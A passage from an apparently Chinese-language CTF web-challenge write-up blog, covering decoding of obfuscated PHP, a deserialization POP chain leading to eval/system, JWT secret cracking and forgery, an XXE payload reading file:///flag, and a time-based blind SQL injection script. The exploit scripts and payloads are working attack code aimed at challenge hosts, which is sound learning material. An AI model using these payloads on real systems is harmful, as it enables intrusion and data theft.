NeUFwTXlBcE15QXBNeUFwTXlBcE1mcmZkYUFNZ2syMWdTZVlTeUFwTXlBcE15QWo5QXgwU0FUUVRTT1FIbDJxMFNBb3VORjllcVVZeGwzb3d0MTBJU3JZU3lBcE15QXBNeUFqMWF4aFFsVFFkYU9RNmZQTWdyMWpXTjFvYXQzaDBsQkVFU2VZU3VSbj0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7&quot;));</span><br><br>        <span class="hljs-comment">/*$O0O000=&quot;jyHqIYdrMuVxkNQUgeWlbtaZPREFoKJCnBhwDXpAOmfGSivscTLzzwcXykECmsqLghRNMZJQaGvfWoFUnStAxjdVirIpbTuOPBDYleKHWi9VvcpSk2Ldl3mMRTQYacQyfrtwvJ5xEO9sAxYSyApMyApMyAjVEJtYvJmMtOF7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3Edv2q1lAMIABpMyApMyApMZVnMyApMyApMyApMyApMyApMtconvrmMKe4MkPp9yAtTZcdCycQDEPpBbVnMyApMyApMyc0SABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syU9ufOqHEct1k3RnSRnMyApMyApMycYSyApMyApMyApMyApMyApMyOqzvO8MtconvrmMKe4MkP4Bq293yzYSyApMyApMyAj9Ax0SAThYkrhHyFtda2EYkJo5ZVnMyApMyApMycj1kTLIkwpgkzYSyApMyApMyAjVEJtYvJmMtOm7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3oDN3owvJ5xSAgSyApMyApMyAj7ABpMyApMyApMyApMyApMyApgEOdIlwpGWBjByA0+yOddlcj5SAo0vOQHyA0+yOmIbVnMyApMyApMyc0SuRnSk2Ldl3mMqTUsoOUwv2dDaO1QZVnMyApMyApMycj1kTLIkwpgfiYSABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syOddlcj5SAozaJRIZVnMyApMyApMyApMyApMyApMfrfdaAMgk21gSeYSyApMyApMyAj9Ax0SATQTSOQHl2q0SAouNF9eqUYxl3owt10ISrYSyApMyApMyAj1axhQlTQdaOQ6fPMgr1jWN1oat3h0lBEESeYSuRn=&quot;;  </span><br><span class="hljs-comment">        eval(&#x27;?&gt;&#x27;.$base64($ggstrtr($ggsubstr($O0O000,$gg52*2),$ggsubstr($O0O000,$gg52,$gg52),    </span><br><span class="hljs-comment">        $ggsubstr($O0O000,0,$gg52))));*/</span><br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BillyHerrington</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span> -&gt; a = <span class="hljs-string">&quot;fxxk you &quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt; a.<span class="hljs-string">&quot;Wow&quot;</span>;<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Baoglady</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span> -&gt; b -&gt; <span class="hljs-title function_ invoke__">happy</span>(<span class="hljs-variable">$this</span> -&gt; c);<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VanDarkholme</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">happy</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>很简单的链子</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BillyHerrington</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>        <span class="hljs-comment">// public function __wakeup()</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//         $this -&gt; a = &quot;fxxk you &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br><br>        <span class="hljs-comment">// public function __destruct()</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//         echo $this -&gt; a.&quot;Wow&quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Baoglady</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>        <span class="hljs-comment">// public function __toString()</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//         $this -&gt; b -&gt; happy($this -&gt; c);</span><br>        <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VanDarkholme</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br><br>        <span class="hljs-comment">// public function happy($cmd)&#123;</span><br>        <span class="hljs-comment">//         eval($cmd);</span><br>        <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-variable">$Van</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">VanDarkholme</span>();<br><br><span class="hljs-variable">$Bao</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Baoglady</span>();<br><span class="hljs-variable">$Bao</span>-&gt;b=<span class="hljs-variable">$Van</span>;<br><span class="hljs-variable">$Bao</span>-&gt;c=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br><br><span class="hljs-variable">$Bill</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BillyHerrington</span>();<br><span class="hljs-variable">$Bill</span>-&gt;a=<span class="hljs-variable">$Bao</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;BillyHerrington\&quot;:1&quot;</span>, <span class="hljs-string">&quot;BillyHerrington\&quot;:2&quot;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Bill</span>));<br><br><span class="hljs-comment">// if(isset($_POST[&#x27;str&#x27;]))&#123;</span><br><span class="hljs-comment">//         unserialize($_POST[&#x27;str&#x27;]);</span><br><span class="hljs-comment">// &#125;</span><br></code></pre></td></tr></table></figure><p>先找destruct入手，rce的点在VanDarkholme::happy()</p><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;BillyHerrington&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Baoglady&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;VanDarkholme&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;d&quot;</span>;N;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;system(&#x27;cat /fla*&#x27;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="easygame"><a href="#easygame" class="headerlink" title="easygame"></a>easygame</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004048.png" alt="image-20221121101757227"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">成功辣，带上这个去<span class="hljs-regexp">/secure/</span>admin试试运气吧:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjY4OTk4ODQ3LCJpYXQiOjE2Njg5OTcwNDd9.a88sCB8IxQBdm7zxawLJHT3VFLxw1mRsGjvAR_7Uh9I<br></code></pre></td></tr></table></figure><p>然后</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004049.png" alt="image-20221121101952090"></p><p>用myjwt破解一下密钥</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004050.png" alt="image-20221121103435994"></p><p>可使用jwt.io伪造cookie（前提是header不是none）</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004051.png" alt="image-20221121231715393"></p><p>过期时间exp记得更改一下，替换authorization登录成功</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-number">5</span>LiL5LiA5YWz55u05o6l5Y67L1htbOeci+eci+acieayoeacieS9oOaDs+imgeeahOS4nOilv+WQpyEhIQ==<br>下一关直接去/Xml看看有没有你想要的东西吧!!!<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004052.png" alt="image-20221121232748788"></p><p>打XXE</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE xxe [ <br>&lt;!ELEMENT name ANY &gt; <br>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; <br>&lt;user&gt;&lt;firstname&gt;&amp;xxe;&lt;/firstname&gt;&lt;lastname&gt;xxe&lt;/lastname&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004053.png" alt="image-20221121235557410"></p><p>注意content-type:application&#x2F;xml</p><h2 id="ezrequset"><a href="#ezrequset" class="headerlink" title="ezrequset"></a>ezrequset</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004054.png" alt="image-20221121115235146"></p><p>发现每次进入抢课页面，学姐想要的课都不一样</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004055.png" alt="image-20221121115322208"></p><p>所以分两部分写脚本，一部分获取课程号课程名，一部分抢课</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">QK</span>(<span class="hljs-params">num,clas</span>):<br>xkurl = <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com:80/?action=check&quot;</span><br>xkcookies = &#123;<span class="hljs-string">&quot;_ga_6Z7QSHBBV1&quot;</span>: <span class="hljs-string">&quot;GS1.1.1668912977.1.1.1668913363.0.0.0&quot;</span>, <span class="hljs-string">&quot;_ga&quot;</span>: <span class="hljs-string">&quot;GA1.1.405875051.1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lpvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668913017&quot;</span>, <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;00c6d1bd25c93e83428cb35f20d6908c&quot;</span>&#125;<br>xkheaders = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=index&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>xkdata = &#123;<span class="hljs-string">&quot;num&quot;</span>: num, <span class="hljs-string">&quot;class&quot;</span>: clas&#125;<br>flag=requests.post(xkurl, headers=xkheaders, cookies=xkcookies, data=xkdata)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;抢到了&quot;</span> <span class="hljs-keyword">in</span> flag.text:<br><span class="hljs-built_in">print</span>(flag.headers)<br>exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cname</span>():<br>JRurl = <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com:80/?action=index&quot;</span><br>JRcookies = &#123;<span class="hljs-string">&quot;_ga_6Z7QSHBBV1&quot;</span>: <span class="hljs-string">&quot;GS1.1.1668912977.1.1.1668913363.0.0.0&quot;</span>, <span class="hljs-string">&quot;_ga&quot;</span>: <span class="hljs-string">&quot;GA1.1.405875051.1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lpvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668913017&quot;</span>, <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;00c6d1bd25c93e83428cb35f20d6908c&quot;</span>, <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-string">&quot;hacker!!&quot;</span>&#125;<br>JRheaders = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com/&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://x7703041-694c-11ed-bc58-165319f5738e.challenge.sycsec.com&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>JRdata = &#123;<span class="hljs-string">&quot;xh&quot;</span>: <span class="hljs-string">&quot;222&quot;</span>&#125;<br>result=requests.post(JRurl, headers=JRheaders, cookies=JRcookies, data=JRdata)<br><span class="hljs-built_in">print</span>(result.text[<span class="hljs-number">985</span>:-<span class="hljs-number">559</span>])<br><span class="hljs-keyword">return</span> (result.text[<span class="hljs-number">985</span>:-<span class="hljs-number">559</span>])<br><br><span class="hljs-keyword">for</span> ci <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>reg1=cname()<br>r1=<span class="hljs-string">&quot;&quot;</span><br>r2=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reg1:<br><span class="hljs-keyword">if</span> i==<span class="hljs-string">&quot;号&quot;</span>:<br>f=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> f==<span class="hljs-number">0</span>:<br>r1+=i<br><span class="hljs-keyword">else</span>:<br>r2+=i<br>QK(r1,r2[<span class="hljs-number">1</span>:])<br><span class="hljs-comment"># print(r1)</span><br><span class="hljs-comment"># print(r2[1:])</span><br></code></pre></td></tr></table></figure><p>这里没用正则，我的正则写的太烂，后面有空补。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004056.png" alt="image-20221121115425680"></p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/t1ps.php<br></code></pre></td></tr></table></figure><p>t1ps.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//$sql=&quot;SELECT secretpass FROM vanzy_secret WHERE  username=&#x27;vanzy&#x27; and secretpass=&#x27;$secretpass&#x27;;&quot;; </span><br></code></pre></td></tr></table></figure><p>发现过滤了特别多东西，连in都过滤了，</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004057.png" alt="image-20221121135401374"></p><p>这样的话好像没什么姿势能获取到表名，进行下一步，仅仅能查他给出的vanzy_secret表</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>burp0_url = <span class="hljs-string">&quot;http://va998658-695b-11ed-bc58-165319f5738e.challenge.sycsec.com:80/login.php&quot;</span><br>burp0_cookies = &#123;<span class="hljs-string">&quot;_ga_6Z7QSHBBV1&quot;</span>: <span class="hljs-string">&quot;GS1.1.1668912977.1.1.1668913363.0.0.0&quot;</span>, <span class="hljs-string">&quot;_ga&quot;</span>: <span class="hljs-string">&quot;GA1.1.405875051.1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668912977&quot;</span>, <span class="hljs-string">&quot;Hm_lpvt_de04fce43c04179bde6b091183a9fc5d&quot;</span>: <span class="hljs-string">&quot;1668913017&quot;</span>, <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;4ddd9beb28657ea2c8d5b8f511725ba7&quot;</span>, <span class="hljs-string">&quot;td_cookie&quot;</span>: <span class="hljs-string">&quot;3992872535&quot;</span>&#125;<br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://va998658-695b-11ed-bc58-165319f5738e.challenge.sycsec.com&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://va998658-695b-11ed-bc58-165319f5738e.challenge.sycsec.com/login.php&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br><span class="hljs-comment">#payload=&quot;&#x27;/**/or/**/if(ascii(mid((select/**/version()),%d,1))/**/like/**/%d,sleep(1),1)#&quot;%(j,i)</span><br>payload=<span class="hljs-string">&quot;&#x27;/**/or/**/if(ascii(mid((select/**/group_concat(secretpass)from/**/vanzy_secret),%d,1))/**/like/**/%d,sleep(1),1)#&quot;</span>%(j,i)<br>burp0_data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;vanzy&quot;</span>, <span class="hljs-string">&quot;secretpass&quot;</span>: payload, <span class="hljs-string">&quot;login&quot;</span>: <span class="hljs-string">&quot;\xc3\xa7\xc2\x99\xc2\xbb\xc3\xa5\xc2\xbd\xc2\x95&quot;</span>&#125;<br>t1=time.time()<br>req=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)<br>t2=time.time()<br><span class="hljs-keyword">if</span> t2-t1&gt;<span class="hljs-number">0.8</span>:<br>result+=<span class="hljs-built_in">chr</span>(i)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span>)<br><br></code></pre></td></tr></table></figure><p>信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">2</span>.<span class="hljs-number">26</span>-MariaDB-log<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004058.png" alt="image-20221121135433184"></p><p>查到密码，登录后就得到flag。</p><h2 id="Not-Stay"><a href="#Not-Stay" class="headerlink" title="Not_Stay"></a>Not_Stay</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004059.png" alt="image-20221121143410081"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//简单的实现文件头检测</span><br><span 